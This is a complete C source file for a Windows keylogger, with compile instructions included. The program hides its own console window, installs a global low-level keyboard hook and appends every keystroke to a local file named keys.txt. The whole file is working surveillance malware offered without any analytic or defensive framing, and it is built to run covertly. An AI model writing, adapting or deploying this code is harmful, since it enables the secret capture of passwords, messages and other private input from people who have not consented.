// Language: C11, File: keylogger.c, Target: Windows
// Compile: cl.exe /O2 keylogger.c user32.lib

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

HHOOK hHook;
FILE* logFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = p->vkCode;

            if (logFile) {
                // Handle standard printable characters (A-Z, 0-9, and symbols)
                if ((vkCode >= 0x30 && vkCode <= 0x5A) || (vkCode >= 0x60 && vkCode <= 0x6F)) {
                    fprintf(logFile, "%c", (char)vkCode);
                }
                // Handle Space
                else if (vkCode == VK_SPACE) {
                    fprintf(logFile, " ");
                }
                // Handle Enter
                else if (vkCode == VK_RETURN) {
                    fprintf(logFile, "\n");
                }
                // Handle Backspace
                else if (vkCode == VK_BACK) {
                    fprintf(logFile, "[BACK]");
                }
                // Handle other special keys
                else {
                    fprintf(logFile, "[0x%02X]", vkCode);
                }
                fflush(logFile); // Write immediately to disk
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // Hide console window
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    // Open log file
    logFile = fopen("keys.txt", "a");
    if (!logFile) return 1;

    // Set the global low-level keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) return 1;

    // Windows message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hHook);
    fclose(logFile);

    return 0;
}
